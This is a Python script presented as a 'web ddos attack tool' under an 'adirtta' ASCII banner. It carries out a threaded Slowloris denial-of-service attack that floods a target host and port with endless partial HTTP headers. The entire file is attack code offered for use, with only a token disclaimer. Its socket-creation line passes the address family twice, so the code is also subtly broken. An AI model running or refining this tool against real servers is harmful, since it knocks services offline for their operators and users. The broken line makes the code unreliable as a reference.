import socket
import threading
import time

# ASCII Art for "ADIRTTA" using '|_' style
def ascii_art_adirtta():
    print(r"""
   
    
             ___    ____  ________  _______________
            /   |  / __ \/  _/ __ \/_  __/_  __/   |
           / /| | / / / // // /_/ / / /   / / / /| |      💀 code by adirtta 💀
          / ___ |/ /_/ // // _, _/ / /   / / / ___ |      THANK YOU FOR USE MY TOOL❤
         /_/  |_/_____/___/_/ |_| /_/   /_/ /_/  |_|       don't copy my tool ☺️🤗

         A web ddos attack tool. So So don't use it for wrong and unethical activities

""")

# Optimized Slowloris function with threading for faster execution
def slowloris_thread(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /? HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())

        # Faster loop to send partial headers
        while True:
            s.send(b"X-a: b\r\n")
            time.sleep(0.01)  # Further reduced delay to make it faster
    except socket.error:
        return

def slowloris(target, port, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=slowloris_thread, args=(target, port))
        thread.start()
        print(f"Started thread {i + 1}")

if __name__ == "__main__":
    ascii_art_adirtta()  # Display the ASCII art for 'ADIRTTA'

    target = input("Enter the target IP or domain: ")
    port = int(input("Enter the port number: "))
    num_threads = int(input("Enter the number of threads (more = faster): "))
    
    slowloris(target, port, num_threads)


    print(f"Thank you for use my tool")
